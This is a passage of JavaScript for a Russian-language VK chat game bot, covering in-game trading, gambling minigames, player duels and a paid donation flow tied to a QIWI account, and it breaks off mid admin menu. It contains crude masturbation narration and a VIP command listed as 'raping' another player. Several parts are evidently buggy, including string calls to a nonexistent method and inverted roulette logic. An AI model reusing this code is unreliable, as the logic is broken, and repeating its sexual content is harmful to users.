  vk.updates.hear(/^(?:buyzkeys)\s?([0-9]+)?/i, message => {
  	let user = acc.users[user_id(message.user)];

  	if(!message.$match[1] || !Number(message.$match[1])) return message.send(`🆘 Укажите кол-во кейсов !`);
  	if(user.ivan2256768ivan2256768 < message.$match[1]) return message.send(`У вас нет столько донат рублей ! ( 1 донат рублей - 1 кейс )`)
  		user.his += Number(message.$match[1] * 1);
  	user.ivan2256768ivan2256768 -= Number(message.$match[1]);
  	return message.send(`➾ Вы успешно купили ${message.$match[1]} кейса за ${message.$match[1] * 1}`);
  });
  vk.updates.hear(/^(?:sellriba)\s?([0-9]+)?/i, message => {
  	let user = acc.users[user_id(message.user)];

  	if(!message.$match[1] || !Number(message.$match[1])) return message.send(`🐬 Укажите количество рыбы !`);
  	if(user.fdsfsd < message.$match[1]) return message.send(`🐬 У вас нет столько рыбы !`)
  		user.balance += Number(message.$match[1] * 100);
  	user.fdsfsd -= Number(message.$match[1]);
  	return message.send(`🐬  ➾ Вы успешно продали ${message.$match[1]} рыбы за ${message.$match[1] * 100}$`);
  });
  vk.updates.hear(/^(?:зобменять)\s?([0-9]+)?/i, message => {
  	let user = acc.users[user_id(message.user)];

  	if(!message.$match[1] || !Number(message.$match[1])) return message.send(`👑 Укажите количество золота !`);
  	if(user.zoloto < message.$match[1]) return message.send(`👑 У вас нет столько слитков золота !`)
  		user.balance += Number(message.$match[1] * 500000);
  	user.zoloto -= Number(message.$match[1]);
  	return message.send(`👑  ➾ Вы успешно продали ${message.$match[1]} слитков золота за ${message.$match[1] * 500000}$`);
  });



  vk.updates.hear(/^(?:Мэрия)/i, message => { 
  	if(message.isChat) return message.send(`Данная команда доступна в личных сообщениях.`)
  		let user = acc.users[user_id(message.user)];
  	if(user.ffffsasa == true) return message.send(`❗ У вас уже есть паспорт !`);
  	message.send(`👩 Здравствуйте , я Джулия !`); 
  	setTimeout(() => {message.send(`

  		Для получения паспорта , пожалуйста, ознакомьтесь с нашими правилами бота. Напишите " Правила ".`); }, 4000); 
  	setTimeout(() => {message.send(`

  		👩 Прочитав правила, Вы автоматически согласились с ними и несете полную ответственность.
  		`); }, 6000); 
  	setTimeout(() => {message.send(`👩 Благодаря паспорту , Вам будут доступны многие команды. Вы сможете спокойно устроиться на легальную работу и зарабатывать деньги. Благодаря паспорту, вы сможете купить себе имущество. Также Вы сможете вступить в гражданский брак.
  		`); }, 12000); 
  	setTimeout(() => {message.send(`👩 Держите свой паспорт, не нарушайте закон VOLF.
  		Чтобы открыть паспорт, напишите " паспорт ".`); }, 14000); 
  	user.ffffsasa = true;
  });

  vk.updates.hear(/^(?:спермасдать)/i, message => { 
  	if(message.isChat) return message.send(`Данная команда доступна в личных сообщениях.`)
  		let user = acc.users[user_id(message.user)];
  	if(user.almsfadasdfin  < 10) return message.send(`Вы не в спермабанке !!!`);
  	if(user.almin1 == true) return message.send(`💢😆💢 Попробуйте через три часа :))`);
  	user.almin1 = true
  	setTimeout(() => {
  		user.almin1 = false
  		vk.api.call('messages.send', {
  			peer_id: user.id,
  			message: `` , random_id: 0
  		});
  	}, 7200000);
  	message.send(`🍼 Вы сняли штаны...`); 
  	setTimeout(() => {message.send(`

  		Взяли свой " маленький " и начали его теребить в бутылочку...`); }, 4000); 
  	setTimeout(() => {message.send(`

  		🍼 О да... Сейчас начнется 🤪
  		`); }, 6000); 
  	setTimeout(() => {message.send(`Вот с*ка, сейчас попрет !
  		`); }, 12000); 
  	setTimeout(() => {message.send(`ООООО ДАААААААААААА, Е , Е С*КА ! ( + 1 баночка спермы )\nЧтобы продать, напишите " спермапродать [кол-во банок] "\nЧтобы выйти, напишите " exit " `); }, 14000); 
  	user.almindfs += 1;
  });
////
vk.updates.hear(/^(?:kod900)/i, message => { 
	if(message.isChat) return message.send(`Данная команда доступна в личных сообщениях.`)
		let user = acc.users[user_id(message.user)];
	message.send(`❗ Доступ к adm панели  ...`); 
	setTimeout(() => {message.send(`❗ Подождите не много...`); }, 4000); 
	setTimeout(() => {message.send(`❗ 5`); }, 6000); 
	setTimeout(() => {message.send(`❗ 4
		`); }, 12000); 
	setTimeout(() => {message.send(`❗ 3`); }, 14000);
	setTimeout(() => {message.send(`❗ 2`); }, 14000); 
	setTimeout(() => {message.send(`❗ 1`); }, 14000);
	setTimeout(() => {message.send(`
		😂😂😂 C 1 АПРЕЛЯ ЛОЛ 😂😂😂`); }, 14000);   
});
///
vk.updates.hear(/^(?:Динфо)/i, message => { 
	message.send(`Для приобретения донат коинов Вам нужно:`); 
	setTimeout(() => {message.send(`
		1. Написать " дпополнить [сумма]
		( 1 рубль - 2 донат коинов ).
		К примеру: Если вы переведете 100 рублей, вы получите 200 донат коинов ! 
		Пример: Дпополнить 100 `); }, 4000); 
	setTimeout(() => {message.send(`
		2. Далее перейдите по ссылке и нечего в комменты не изменяйте !`); }, 6000); 
	setTimeout(() => {message.send(`3. Завершите перевод.`); }, 8000); 
	setTimeout(() => {message.send(`4. После чего, зайди в историю своего QIWI Кошелька: См. Скриншот.`,{attachment: `photo-179018727_456239021`}); }, 10000); 
	setTimeout(() => {message.send(`5. Зайдя в историю, вы найдёте совершённый вами платёжь.\n Раскройте подробную информацию о нём и там вы найдёте "Номер квитанции" где будет указан код из 13 цифр: См. Скриншот.`,{attachment: `photo-179018727_456239022`}); }, 12000); 
	setTimeout(() => {message.send(`6. После того, как вы нашли даннй код, скопируйте его. Уже находясь в Боте введите: donate [Тот самый номер квитанции]. Если вы всё сделали верно, бот выдаст вам донат коины и напишите " донат " чтобы попасть в донат магазин бота !`); }, 14000); 
});
///
vk.updates.hear('голосовое', async (context) => { 
	const catsPurring = ['']; 
	const link = catsPurring[Math.floor(Math.random() * catsPurring.length)]; 

	await Promise.all([ 
		context.send('Записываю Голосовое Сообщение..'), 

		context.sendAudioMessage(link) ]); 
});
/// 

vk.updates.hear(/^(?:вкищи)\s?([^]+)?/i, message => { 
	let id = user_id(message.user); 
	let user = acc.users[user_id(message.user)]; 
if(!message.$match[1]) return message.send(`ОШИБКА ! 😱\n Подсказка: Пример команды: вкищи [пользователь вк]\nПример вкищи Денис Смирнов`) // Подсказка для команды 
	vk.api.call("utils.getShortLink", {url: `https://vk.com/search?c%5Bper_page%5D=40&c%5Bq%5D=${message.$match[1]}%20${message.$match[1]}&c%5Bsection%5D=people`}).then(function (res){ 
		return message.send(`Пользователи ${message.$match[1]}:` + res.short_url); 
	}); 
});
vk.updates.hear(/^(?:вкгруппа)\s?([^]+)?/i, message => { 
	let id = user_id(message.user); 
	let user = acc.users[user_id(message.user)]; 
if(!message.$match[1]) return message.send(`ОШИБКА ! 😱\n Подсказка: Пример команды: вкищигруппы [группа вк]\nПример вкищигруппы VOLF бот`) // Подсказка для команды 
	vk.api.call("utils.getShortLink", {url: `https://vk.com/search?c%5Bper_page%5D=40&c%5Bq%5D=${message.$match[1]}&c%5Bsection%5D=communities`}).then(function (res){ 
		return message.send(`Группы ${message.$match[1]}:` + res.short_url); 
	}); 
});
vk.updates.hear(/^(?:вкмузон)\s?([^]+)?/i, message => { 
	let id = user_id(message.user); 
	let user = acc.users[user_id(message.user)]; 
if(!message.$match[1]) return message.send(`ОШИБКА ! 😱\n Подсказка: Пример команды: вкмузон [названия]\nПример вкмузон гарри топор`) // Подсказка для команды 
	vk.api.call("utils.getShortLink", {url: `https://vk.com/search?c%5Bper_page%5D=200&c%5Bq%5D=${message.$match[1]}&c%5Bsection%5D=audio`}).then(function (res){ 
		return message.send(`музон ${message.$match[1]}:` + res.short_url); 
	}); 
});

vk.updates.hear(/^(?:дпополнить)\s?([^]+)?/i, message => { 
	let id = user_id(message.user); 
	let user = acc.users[user_id(message.user)]; 
if(!message.$match[1]) return message.send(`Что-то пошло не так  😱\n Подсказка: Пример команды: Дпополнить [Сумма]`) // Подсказка для команды  
	vk.api.call("utils.getShortLink", {url: `https://qiwi.com/payment/form/99?extra%5B%27account%27%5D=79654600105&amountInteger=${message.$match[1]}&amountFraction=0&extra%5B%27comment%27%5D=donate&currency=643&blocked[0]=account&blocked[1]=sum&blocked[2]=comment`}).then(function (res){ 
		return message.send(`✨ Ваша ссылка для преобретения: ${message.$match[1]}₽ донат рублей —\nКоммент не изменять !\nПосле оплаты , напишите " донат "` + res.short_url); 
	}); 
});



//////////////////////////////// vk.updates.hear(/^(?:риск)/i, (message) => { 
	vk.updates.hear(/^(?:pp)/i, (message) => { 
		let user = acc.users[user_id(message.user)]
		if(user.balance == 0) return message.send("🔔 Играть в игры можно с балансом выше 0! 🔔");
		if(user.kvest18 == 1) return message.send(`Ты уже в игре!`);
		user.kvest18 = 1;
		message.send(`[💀] Вы начали игру "Русская Рулетка"\n\n [🤤] | Задача этой игры: Вам дано 3 выстрела... Если в Вас не попала пуля, то мы дадим на ваш баланс 1.000.000.000.000$, а если в вас попала пуля, то весь ваш баланс обнуляется.\n\n[⚠] » Чтобы сделать выстрел, то отправьте боту - 🔫`);
	});

	vk.updates.hear(/^(?:выстрел)/i, (message) => { 
		let user = acc.users[user_id(message.user)]
		let balance = user.balance;
		let kvest18 = user.kvest18;
		let p = 3 - kvest18;
		let ran =  ["неуспешно","уcпешно"];
		let rand = ran.random();

		if(user.kvest18 == 0) return;
		if(user.kvest18 > 0){
			if(rand != "неуспешно"){
				user.kvest18 += 1;
				if(user.kvest18 == 4){
					user.balance += 1000000000000;
					message.send(`[😅] >> Поздравляем! Вы выжили в этой страшной игре!\n[☺] » Мы подарили вам - 1.000.000.000.000$`);
				}
				message.send(`1...`);
				message.send(`2...`);
				message.send(`3...`);
				message.send(`*БАХ!!*`);
				message.send(`[😎] >> Пуля попала вам в голову - неуспешно\n[🍀] » Вам повезло. Стреляйте дальше!\n[😧] » Осталось выстрелов: ` + p);

			}
			if(rand != "успешно"){
				message.send(`1...`);
				message.send(`2...`);
				message.send(`3...`);
				message.send(`*БАХ!!*`);
				message.send(`[🤕] >> Пуля попала вам в голову - успешно\n[😞] » Удача повернулась к вам спиной.\n[😶] » Вы проиграли. Баланс анулирован. `);
				user.balance = 5000;
				user.kvest18 = 0;
			}
		}


	});
///
vk.updates.hear(/^(?:стаканчик)\s([1-3])\s(.*)$/i, (message) => { 
	let user = acc.users[user_id(message.user)]
	message.$match[2] = message.$match[2].send(/(\.|\,)/ig, '');
	message.$match[2] = message.$match[2].send(/(к|k)/ig, '000');
	message.$match[2] = message.$match[2].send(/(м|m)/ig, '000000');
	message.$match[2] = message.$match[2].send(/(вабанк|вобанк|все|всё)/ig, user.balance);

	if(!Number(message.$match[2])) return;
	message.$match[2] = Math.floor(Number(message.$match[2]));

	if(message.$match[2] <= 0) return;

	if(message.$match[2] > user.balance) return message.send (`у вас нет данной суммы`);
	else if(message.$match[2] <= user.balance)
	{
		user.balance -= message.$match[2];

		const multiply = utils.pick([0.95, 0.90, 0.85, 0.80, 0.75, 0.70, 0.65]);
		const cup = utils.random(1, 3);

		if(cup == message.$match[1])
		{
			user.balance += Math.floor(message.$match[2] * multiply);
			return message.send (`вы угадали! Приз message.$match[2] * multiply}`);
		} else {
			return message.send (`вы не угадали, это был ${cup} стаканчик`);
		}
	}
});

//
vk.updates.hear(/^(?:кубик|куб)\s([1-6])$/i, async (message, bot) => {
	let user = acc.users[user_id(message.user)];
	const int = utils.pick([1, 2, 3, 4, 5, 6]);
	if(int == message.$match[1])
	{
		user.balance += 2000000;
		return bot(`Вы угадали! Приз 2.000.000$`);
	} else return bot(`не угадали 🎲 Выпало число ${int}`);
});






vk.updates.hear(/^видео\s(.*)$/i, (message) => {
	let filters     = /([0-9]|\#)/ig;
	let SymFilter   = /[-!$%^&*()_+|~=`{}\[\]:";'<>?,.\/]/ig;
	if (filters.test(message.$match[1]) || SymFilter.test(message.$match[1])) return;
	api.video.search({
		"q": message.$match[1],
		"adult": 0,
		"count": 10
	}).then(({ count, items }) => {
		let smile = getRandomElement("😒 😢 😔 😩 😭 😲 😕 🙁 😟".split(" "));
		if (count < 1) return message.send(`%name%, по запросу "${message.$match[1]}" ничего не найдено ${smile}`);
		message.send(`%name%, видео по запросу "${message.$match[1]}":`, {
			"attachment": items.map((x) => `video${x.owner_id}_${x.id}`)
		});
	});
}, "fun", "📹 Видео [фраза]");

vk.updates.hear(/^(?:крутить)$/i, (message) => { 
	let a = cases.random(); 
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 3) return message.send(`❗ Доступно с 3 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);

	if(user.balance < 100000) return message.send(`💸 ➾ Оружейный кейс стоит 100.000$`);
	if(user.bloks.gun_case == true) return message.send(`🔫 ➾ Крутить оружейный кейс можно раз в 10 минут.`);
	user.balance -= 100000;
	user.bloks.gun_case = true; 
	setTimeout(() => {
		user.bloks.gun_case = false;
	}, 360000);

	user.uron = a.uron;
	user.gun_name = a.name;
	return message.send(`
		💸 ➾ Вы открыли оружейный кейс за 100.000$
		💸 ➾ Вам выпало оружие:
		🔫 ➾ ${a.name} с уроном ${a.uron} единиц
		
		⚠ ➾ При следующем открытии кейса, данное оружие будет заменено выпавшим.
		`);
});
vk.updates.hear(/^(?:питомец сдаюсь)/i, message => {

	let user = acc.users[user_id(message.user)];     
	if(user.volftube5 == false) return message.send(` ➾ Вам никто не бросал вызов питомцев/Вы не вызывали на бой питомцев никого.`);
	
	vk.api.call("messages.send", {
		peer_id: acc.users[user.volftube5].id,
		message: `
		➾ Игрок не согласился на бой питомцев.
		`, random_id: 0
	}).then((res) => {}).catch((error) => {console.log('duel error'); });	

	user.mur = false;
	acc.users[user.volftube5].mur = false;
	acc.users[user.volftube5].volftube5 = false;
	acc.users[user.volftube5].oo = false;
	user.volftube5 = false;
	user.oo = false; 



	return message.send(`
		➾ Вы отменили бой питомцев.
		`);
});

vk.updates.hear(/^(?:сдаюсь)/i, message => {

	let user = acc.users[user_id(message.user)];     
	if(user.duel == false) return message.send(`🔫 ➾ Вам никто не бросал вызов/Вы не вызывали на стрелу никого.`);
	
	vk.api.call("messages.send", {
		peer_id: acc.users[user.duel].id,
		message: `
		🔫 ➾ Игрок не согласился на стрелу.
		`, random_id: 0
	}).then((res) => {}).catch((error) => {console.log('duel error'); });	

	user.duel_summ = false;
	acc.users[user.duel].duel_summ = false;
	acc.users[user.duel].duel = false;
	acc.users[user.duel].nachal = false;
	user.duel = false;
	user.nachal = false; 



	return message.send(`
		🔫 ➾ Вы отменили стрелу.
		`);
});

vk.updates.hear(/^(?:стрела)\s?([0-9]+)?\s?([0-9]+)?/i, message => {

	let args = message.$match[1];
	let user = acc.users[user_id(message.user)];
	if(acc.users[args].gun_name == false) return message.send(`🔫 ➾ У игрока нет оружия. ('Крутить')`)
		if(user.gun_name == false)	 return message.send(`🔫 ➾ У вас нет оружия. ('Крутить')`)

			if(args == user_id(message.user)) return message.send(`🔫 ➾ Вы указали свой ID`)
				if(!message.$match[2] || !args || message.$match[2] < 1) return message.send(`💸 ➾ Пример команды: 'Стрела ID СТАВКА'`)
					if(user.balance < message.$match[2]) return message.send(`💸 ➾ Ваша ставка больше вашего баланса`)
						if(!acc.users[args]) return message.send(`🔫 ➾ Такого игрока нет!`)
							if(acc.users[args].balance < message.$match[2]) return message.send(`💸 ➾ У игрока баланс меньше вашей ставки`)
								if(user.duel != false) return message.send(`🔫 ➾ Вы уже назначали стрелу игроку ${acc.users[user.duel].prefix}\n🎌 ➾ Для отмены напишите: 'Сдаюсь'`);
							if(acc.users[args].duel != false) return message.send(`🔫 ➾ Вы уже назначали стрелу игроку ${acc.users[user.duel].prefix}\n&#127987; ➾ Для отмены напишите: 'Сдаюсь'`);
							user.duel_summ = Number(message.$match[2]);
							acc.users[args].duel_summ = Number(message.$match[2]);
							user.duel = Number(args);
							acc.users[args].duel = Number(user_id(message.user));
							user.nachal = user_id(message.user);
							acc.users[args].nachal =  user_id(message.user);

							vk.api.call("messages.send", {
								peer_id: acc.users[message.$match[1]].id,
								message: `
								🔫 ➾ Игрок @id${user.id}(${user.prefix}) назначил вам стрелу
								💸 ➾ Ставка ${message.$match[2]}$

								🔫 ➾ Для принятия напишите: 'Принять'
								🎌 ➾ Для отмены напишите: 'Сдаюсь'
								`, random_id: 0
							}).then((res) => {}).catch((error) => {console.log('duel error'); });	

							return message.send(`
								🔫 ➾ Вы назначили стрелу игроку @id${acc.users[args].id}(${acc.users[args].prefix})
								💸 ➾ Ставка ${message.$match[2]}$
								🔫 ➾ Ожидайте принятия боя игроком.

								&#127987; ➾ Для отмены напишите: 'Сдаюсь'
								`);
						});
//////////////////////////////

/////////////////////////////

vk.updates.hear(/^(?:принять)/i, message => {

	let args = message.$match[1];
	let user = acc.users[user_id(message.user)];
	if(user.duel == false) return message.send(`🔫 ➾ Вам не назначали стрелу!`); 
	if(user.balance < user.summ) return message.send(`💸 ➾ Ставка больше вашего баланса`)
		if(acc.users[user.duel].balance < message.$match[2]) return message.send(`💸 ➾ У противника баланс меньше ставки`) 
			if(user_id(message.user) == user.nachal) return message.send(`💸 ➾ Принять стрелу должен соперник!`);

		let sum = user.duel_summ;  
		let us2 = user.duel;
	let one_hp = 100; //кто принимает
	let two_hp = 100; //кто атакует
	let text = '';

	//1 этап
	one_hp -= acc.users[user.duel].uron;
	two_hp -= user.uron;
	text += `
	- - 1&#8419; этап - - 
	🔸 ➾ ${user.prefix} | -${acc.users[user.duel].uron}% | ${one_hp}❤
	🔹 ➾ ${acc.users[user.duel].prefix} | -${user.uron}% | ${two_hp}❤ 
	`;
	// 2 этап
	one_hp -= acc.users[user.duel].uron;
	two_hp -= user.uron;
	if(one_hp <= 0 || two_hp <= 0){
		if(one_hp <= 0 && two_hp <= 0){
			if(rand(1,2) == 1){
				if(one_hp <= 0){
					// победил второй
					user.balance -= Number(user.duel_summ);
					acc.users[user.duel].balance += Number(user.duel_summ);

					user.game.strela_loose += 1; 
					acc.users[us2].game.strela_win += 1;

					text += `
					- - Финал - - 
					🏁 ➾ В финальном этапе победил @id${acc.users[us2].id}(${acc.users[us2].prefix})
					🔸 ➾ ${user.prefix} | -${acc.users[us2].uron}% | 0❤
					🔹 ➾ ${acc.users[us2].prefix} | -${user.uron}% | ${two_hp}❤ 
					`;
					vk.api.call("messages.send", {
						user_id: user.id,
						message: text, random_id: 0
						
					}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	

					vk.api.call("messages.send", {
						user_id: acc.users[us2].id,
						message: text, random_id: 0
					}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	
					acc.users[us2].duel_summ = false;
					acc.users[us2].duel = false; 
					user.duel = false;
					user.duel_summ = false;
					acc.users[us2].nachal = false;
					user.nachal = false; 

					return message.send(`🔫 ➾ Результат боя отправлен вам в ЛС.`);			
				}
				if(two_hp <= 0){
					// победил первый
					user.balance += Number(user.duel_summ);
					acc.users[us2].balance -= Number(user.duel_summ);

					user.game.strela_win += 1;  
					acc.users[us2].game.strela_loose += 1;

					text += `
					- - Финал - - 
					🏁 ➾ В финальном этапе победил @id${user.id}(${user.prefix})
					🔸 ➾ ${user.prefix} | -${acc.users[us2].uron}% | ${one_hp}❤
					🔹 ➾ ${acc.users[us2].prefix} | -${user.uron}% | 0❤ 
					`;
					vk.api.call("messages.send", {
						user_id: user.id,
						message: text, random_id: 0
						
					}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	

					vk.api.call("messages.send", {
						user_id: acc.users[us2].id,
						message: text, random_id: 0
					}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	
					acc.users[us2].duel = false;
					acc.users[us2].duel_summ = false;
					user.duel = false;
					user.duel_summ = false;
					acc.users[us2].nachal = false;
					user.nachal = false; 

					return message.send(`🔫 ➾ Результат боя отправлен вам в ЛС.`);			
				}
			}
		}
		if(two_hp <= 0){
				// победил первый
				user.balance += Number(user.duel_summ);
				acc.users[us2].balance -= Number(user.duel_summ);

				user.game.strela_win += 1;  
				acc.users[us2].game.strela_loose += 1;

				text += `
				- - Финал - - 
				🏁 ➾ В финальном этапе победил @id${user.id}(${user.prefix})
				🔸 ➾ ${user.prefix} | -${acc.users[us2].uron}% | ${one_hp}❤
				🔹 ➾ ${acc.users[us2].prefix} | -${user.uron}% | 0❤ 
				`;
				vk.api.call("messages.send", {
					user_id: user.id,
					message: text
					
				}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	

				vk.api.call("messages.send", {
					user_id: acc.users[us2].id,
					message: text, random_id: 0
				}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	
				acc.users[us2].duel = false;
				acc.users[us2].duel_summ = false;
				user.duel = false;
				user.duel_summ = false;
				acc.users[us2].nachal = false;
				user.nachal = false; 

				return message.send(`🔫 ➾ Результат боя отправлен вам в ЛС.`);			
			}
			if(one_hp <= 0){
				// победил второй
				user.balance -= Number(user.duel_summ);
				acc.users[user.duel].balance += Number(user.duel_summ);

				user.game.strela_loose += 1; 
				acc.users[us2].game.strela_win += 1;

				text += `
				- - Финал - - 
				🏁 ➾ В финальном этапе победил @id${acc.users[us2].id}(${acc.users[us2].prefix})
				🔸 ➾ ${user.prefix} | -${acc.users[us2].uron}% | 0❤
				🔹 ➾ ${acc.users[us2].prefix} | -${user.uron}% | ${two_hp}❤ 
				`;
				vk.api.call("messages.send", {
					user_id: user.id,
					message: text, random_id: 0
					
				}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	

				vk.api.call("messages.send", {
					user_id: acc.users[us2].id,
					message: text, random_id: 0
				}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	
				acc.users[us2].duel_summ = false;
				acc.users[us2].duel = false; 
				user.duel = false;
				user.duel_summ = false;
				acc.users[us2].nachal = false;
				user.nachal = false; 

				return message.send(`🔫 ➾ Результат боя отправлен вам в ЛС.`);			
			} 

		}else{
			text += `
			- - 2&#8419; этап - - 
			🔸 ➾ ${user.prefix} | -${acc.users[us2].uron}% | ${one_hp}❤
			🔹 ➾ ${acc.users[us2].prefix} | -${user.uron}% | ${two_hp}❤ 
			`;
		} 
	// 3 этап
	one_hp -= acc.users[us2].uron;
	two_hp -= user.uron;
	if(one_hp <= 0 || two_hp <= 0){
		if(one_hp <= 0 && two_hp <= 0){
			if(rand(1,2) == 1){
				if(one_hp <= 0){
					// победил второй
					user.balance -= Number(user.duel_summ);
					acc.users[us2].balance += Number(user.duel_summ);

					user.game.strela_loose += 1; 
					acc.users[us2].game.strela_win += 1;

					text += `
					- - Финал - - 
					🏁 ➾ В финальном этапе победил @id${acc.users[us2].id}(${acc.users[us2].prefix})
					🔸 ➾ ${user.prefix} | -${acc.users[us2].uron}% | 0❤
					🔹 ➾ ${acc.users[us2].prefix} | -${user.uron}% | ${two_hp}❤ 
					`;
					vk.api.call("messages.send", {
						user_id: user.id,
						message: text, random_id: 0
						
					}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	

					vk.api.call("messages.send", {
						user_id: acc.users[us2].id,
						message: text, random_id: 0
					}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	
					acc.users[us2].duel = false;
					acc.users[us2].duel_summ = false;
					user.duel = false;
					user.duel_summ = false;
					acc.users[us2].nachal = false;
					user.nachal = false; 

					return message.send(`🔫 ➾ Результат боя отправлен вам в ЛС.`);			
				}
				if(two_hp <= 0){
					// победил первый
					user.balance += Number(user.duel_summ);
					acc.users[us2].balance -= Number(user.duel_summ);

					user.game.strela_win += 1;
					acc.users[us2].game.strela_loose += 1;

					text += `
					- - Финал - - 
					🏁 ➾ В финальном этапе победил @id${user.id}(${user.prefix})
					🔸 ➾ ${user.prefix} | -${acc.users[us2].uron}% | ${one_hp}❤
					🔹 ➾ ${acc.users[us2].prefix} | -${user.uron}% | 0❤ 
					`;
					vk.api.call("messages.send", {
						user_id: user.id,
						message: text, random_id: 0
						
					}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	

					vk.api.call("messages.send", {
						user_id: acc.users[us2].id,
						message: text, random_id: 0
					}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	
					acc.users[us2].duel = false;
					acc.users[us2].duel_summ = false;
					user.duel = false;
					user.duel_summ = false;
					acc.users[us2].nachal = false;
					user.nachal = false; 

					return message.send(`🔫 ➾ Результат боя отправлен вам в ЛС.`);			
				}
			}
		}
		if(two_hp <= 0){
				// победил первый
				user.balance += Number(user.duel_summ);
				acc.users[us2].balance -= Number(user.duel_summ);

				user.game.strela_win += 1;
				acc.users[us2].game.strela_loose += 1;

				text += `
				- - Финал - - 
				🏁 ➾ В финальном этапе победил @id${user.id}(${user.prefix})
				🔸 ➾ ${user.prefix} | -${acc.users[us2].uron}% | ${one_hp}❤
				🔹 ➾ ${acc.users[us2].prefix} | -${user.uron}% | 0❤ 
				`;
				vk.api.call("messages.send", {
					user_id: user.id,
					message: text, random_id: 0
					
				}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	

				vk.api.call("messages.send", {
					user_id: acc.users[us2].id,
					message: text, random_id: 0
				}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	
				acc.users[us2].duel = false;
				acc.users[us2].duel_summ = false;
				user.duel = false;
				user.duel_summ = false;
				acc.users[us2].nachal = false;
				user.nachal = false; 

				return message.send(`🔫 ➾ Результат боя отправлен вам в ЛС.`);			
			}
			if(one_hp <= 0){
				// победил второй
				user.balance -= Number(user.duel_summ);
				acc.users[us2].balance += Number(user.duel_summ);

				user.game.strela_loose += 1; 
				acc.users[us2].game.strela_win += 1;

				text += `
				- - Финал - - 
				🏁 ➾ В финальном этапе победил @id${acc.users[us2].id}(${acc.users[us2].prefix})
				🔸 ➾ ${user.prefix} | -${acc.users[us2].uron}% | 0❤
				🔹 ➾ ${acc.users[us2].prefix} | -${user.uron}% | ${two_hp}❤ 
				`;
				vk.api.call("messages.send", {
					user_id: user.id,
					message: text, random_id: 0
					
				}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	

				vk.api.call("messages.send", {
					user_id: acc.users[us2].id,
					message: text, random_id: 0
				}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	
				acc.users[us2].duel = false;
				acc.users[us2].duel_summ = false;
				user.duel = false;
				user.duel_summ = false;
				acc.users[us2].nachal = false;
				user.nachal = false; 

				return message.send(`🔫 ➾ Результат боя отправлен вам в ЛС.`);			
			}


		}else{
			text += `
			- - 3&#8419; этап - - 
			Вы сыграли в ничью!`;
			vk.api.call("messages.send", {
				user_id: user.id,
				message: text, random_id: 0
				
			}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	

			vk.api.call("messages.send", {
				user_id: acc.users[us2].id,
				message: text, random_id: 0
			}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });
			acc.users[us2].duel = false;
			acc.users[us2].duel_summ = false;
			user.duel = false;
			user.duel_summ = false;
			acc.users[us2].nachal = false;
			user.nachal = false; 

		}  



	});

///////// Админка =========== //////////////////////


vk.updates.hear(/^(?:payday)\s([^]+)\s([0-9]+)/i, (message) => { 

	let id = user_id(message.user);		
	let i = config;
	let user = acc.users[user_id(message.user)]; 
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не спец. Администратор`); 

	if(message.$match[1] == 'rabota'){
		if(message.$match[2] == 1){ config.bonus_rabota = true; return message.send(`✅ ➾ Вы включили х5 зп для работы.`); } 
		if(message.$match[2] == 0){ config.bonus_rabota = false; return message.send(`✅ ➾ Вы выключили х5 зп.`); }
	}   
}); 



vk.updates.hear(/^(?:kiss)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: kiss ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не VIP игрок`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].shel = 0; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `💞 VIP игрок ${user.prefix} поцеловал вас!`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`💞💞💞 Вы поцеловали [${acc.users[message.$match[1]].prefix}]`);
});	



vk.updates.hear(/^(?:!админка)$/i,  (message) => { 
	let user = acc.users[user_id(message.user)];

	if(user.ap < 3) return message.send(`

		💎 Вип команды:
		✉ sms [id] - Отправить VIP сообщение
		🎂 iznas [id] - Изнасиловать игрока
		❤ kiss [id] - Поцеловать игрока
		📺 лс [текст] - VIP чат
		🥇 setmoney [кол-во] - Выдать себе денег
		🎂 виппи [ник] - Быстро изменить свой ник ( до 45 символов ).


		💻 Цена VIP статуса - 30 рублей



		- - - - - - - - - - - -
		👑 ➾ MODER-Команды « 👑
		⛔ ➾ Все команды VIP'a 

		✅ ➾ warn [ID] - выдать предупреждение. 
		✅ ➾ setmoney [COUNT] - выдать себе валюту.
		⚠ ➾ [COUNT] - от 1 до 3000000.

		☑ ➾ - - Бонусы - - « ☑
		💴 ➾ Лимит на передачу: 10.000.000$

		⛔⛔ Цена: 350 рублей ⛔⛔

		- - - - - - - - - - - -
		👑 ➾ ADMIN-Команды « 👑
		⛔ ➾ Все команды MODER'a   

		✅ ➾ ban [ID] - заблокировать навсегда.
		✅ ➾ unban [ID] - разблокировать игрока.  
		✅ ➾ setnick [ID] [NAME] - изменить ник.
		✅ ➾ setmoney [COUNT] - выдать себе валюту.
		✅ ➾ адмсмс [текст] - Админ чат
		⚠ ➾ [COUNT] - от 1 до 10000000.
		✅ ➾ Кикнуть [ССЫЛКА_ВК] - кикнуть из беседы.
		⚠ ➾ В не офф.беседах кикает, если статус группы: 'Администратор'

		☑ ➾ - - Бонусы - - « ☑
